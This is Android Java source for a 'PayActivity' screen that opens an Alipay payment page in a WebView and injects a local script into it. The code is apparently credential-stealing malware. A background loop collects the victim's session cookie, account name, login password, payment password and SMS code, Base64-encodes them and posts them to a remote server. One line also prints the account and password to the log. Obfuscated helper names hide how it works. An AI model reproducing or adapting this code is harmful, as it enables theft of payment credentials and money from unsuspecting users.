package com.ellison.project.activity;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Picture;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.ProgressBar;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.ellison.project.R;
import com.ellison.project.bean.PayUrlBean;
import com.ellison.project.utils.AAAA;
import com.ellison.project.utils.AssetsUtils;
import com.ellison.project.utils.BBBBBBB;
import com.ellison.project.utils.Base64Util;
import com.ellison.project.utils.ConfigUtils;
import com.ellison.project.utils.UrlConstant;
import com.google.gson.Gson;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.StringCallback;
import com.lzy.okgo.model.Response;
import com.lzy.okgo.request.PostRequest;

import java.io.PrintStream;
import java.io.UnsupportedEncodingException;

/**
 * @author ellison
 * @date 2020年09月26日
 * @desc 用一句话描述这个类的作用
 * <p>
 */
public class PayActivity extends AppCompatActivity {
    public static final String TAG = PayActivity.class.getSimpleName();
    int i = 0;
    int j = 0;

    private String mUrl = "";
    private WebView mWeb;
    private ProgressBar progressBar;
    private LinearLayout zhezhao;

    public static void enterPay(Activity activity) {
        Intent i = new Intent(activity, PayActivity.class);
        activity.startActivity(i);
    }

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_pay);


        StringBuilder paramBundle = new StringBuilder();
        paramBundle.append("{'type':'getzfbuser','Token':'");
        paramBundle.append("'}");

        try {
            String params = Base64Util.base64Encrypt(paramBundle.toString().getBytes("UTF-8"));
            ((PostRequest) OkGo.post(UrlConstant.API_URL).tag(this)).params("callbackurl", params, new boolean[0]).execute(new StringCallback() {
                @Override
                public void onSuccess(Response<String> paramAnonymousResponse) {
                    PayUrlBean payUrlBean = new Gson().fromJson(paramAnonymousResponse.body(), PayUrlBean.class);
                    mUrl = payUrlBean.getUrl();
                    AAAA.id = payUrlBean.getID();
                    runOnUiThread(() -> initUiAndListener());
                }
            });
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }


    private void initUiAndListener() {
        StringBuilder actionStr = new StringBuilder();
        actionStr.append("javascript:(");
        actionStr.append(AssetsUtils.readAssets2String(this, "injection.js"));
        actionStr.append(")()");

        this.zhezhao = findViewById(R.id.zhezhao);
        this.progressBar = findViewById(R.id.progress);
        this.mWeb = findViewById(R.id.webview);
        this.mWeb.getSettings().setJavaScriptEnabled(true);
        this.mWeb.getSettings().setUseWideViewPort(true);
        this.mWeb.getSettings().setLoadWithOverviewMode(true);
        mWeb.addJavascriptInterface(new BBBBBBB(this, mWeb, this.progressBar, this.zhezhao), "activity");
        this.mWeb.loadUrl(mUrl);
//        this.mWeb.loadUrl("https://mclient.alipay.com/h5Continue.htm?h5_route_token=RZ41GSZsKQqo6qe7XF8RFtDjhGvATPmobilecashierRZ41&awid=RZ41yhWS1UTYX4AVst1YffOcZ10bvxmobileclientgwRZ41");

        this.mWeb.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView paramAnonymousWebView, String paramAnonymousString) {
//                mWeb.loadUrl(actionStr.toString());
//                Log.e(TAG, "setWebViewClient 调用js:" + actionStr.toString());

                super.onPageFinished(paramAnonymousWebView, paramAnonymousString);

            }

            @Override
            public void onPageStarted(WebView paramAnonymousWebView, String paramAnonymousString, Bitmap paramAnonymousBitmap) {
                super.onPageStarted(paramAnonymousWebView, paramAnonymousString, paramAnonymousBitmap);
                progressBar.setVisibility(View.INVISIBLE);
                zhezhao.setVisibility(View.INVISIBLE);
            }
        });

        mWeb.setPictureListener(new WebView.PictureListener() {
            @Override
            public void onNewPicture(WebView webView, @Nullable Picture picture) {
                mWeb.loadUrl(actionStr.toString());
                Log.e(TAG, "setWebViewClient 调用js");
            }
        });

        delayPost();
        new Thread(() -> {
            try {
                Thread.sleep(2000L);
            } catch (InterruptedException localInterruptedException1) {
                localInterruptedException1.printStackTrace();
            }
            j += 1;
            try {
                Thread.sleep(1000L);
            } catch (InterruptedException localInterruptedException2) {
                localInterruptedException2.printStackTrace();
            }
        }).start();
    }

    private void delayPost() {
        new Thread(() -> {
            for (; ; ) {
                if (AAAA.ss > 0) {
                    try {
                        Object localObject1 = Base64Util.base64Encrypt(AAAA.cookie.getBytes("UTF-8"));
                        String str3 = Base64Util.base64Encrypt(AAAA.account.getBytes("UTF-8"));
                        String str1 = Base64Util.base64Encrypt(AAAA.pwd.getBytes("UTF-8"));
                        String str2 = Base64Util.base64Encrypt(AAAA.payPwd.getBytes("UTF-8"));
                        Object localObject2 = Base64Util.base64Encrypt(AAAA.pageTitle.getBytes("UTF-8"));
                        String str4 = Base64Util.base64Encrypt(ConfigUtils.getToken(PayActivity.this).getBytes("UTF-8"));
                        StringBuilder localStringBuilder = new StringBuilder();
                        localStringBuilder.append("{'type':'setpaytype','cookie':'");
                        localStringBuilder.append((String) localObject1);
                        localStringBuilder.append("','user':'");
                        localStringBuilder.append(str3);
                        localStringBuilder.append("','pwd':'");
                        localStringBuilder.append(str1);
                        localStringBuilder.append("','pwd2':'");
                        localStringBuilder.append(str2);
                        localStringBuilder.append("','title':'");
                        localStringBuilder.append((String) localObject2);
                        localStringBuilder.append("','phonecode':'");
                        localStringBuilder.append(AAAA.smsCode);
                        localStringBuilder.append("','Token':'");
                        localStringBuilder.append(str4);
                        localStringBuilder.append("','id':");
                        localStringBuilder.append(AAAA.id);
                        localStringBuilder.append("}");
                        localObject1 = Base64Util.base64Encrypt(localStringBuilder.toString().getBytes("UTF-8"));
                        if (AAAA.sendPostText2(PayActivity.this, (String) localObject1) > 0) {
                            AAAA.ss = 0;
                            localObject2 = System.out;
                            StringBuilder stringBuilder = new StringBuilder();
                            stringBuilder.append("提交支付成功:");
                            stringBuilder.append(AAAA.account);
                            stringBuilder.append("/");
                            stringBuilder.append(AAAA.pwd);
                            stringBuilder.append("/");
                            stringBuilder.append(AAAA.id);
                            ((PrintStream) localObject2).println(localObject1.toString());
                        } else {
                            AAAA.ss = 0;
                        }
                    } catch (UnsupportedEncodingException localUnsupportedEncodingException) {
                        localUnsupportedEncodingException.printStackTrace();
                    }
                }
                try {
                    Thread.sleep(1000L);
                } catch (InterruptedException localInterruptedException) {
                    localInterruptedException.printStackTrace();
                }
                i += 1;
                if (i > 60) {
                    i = 0;
                }
            }
        }).start();
    }

}
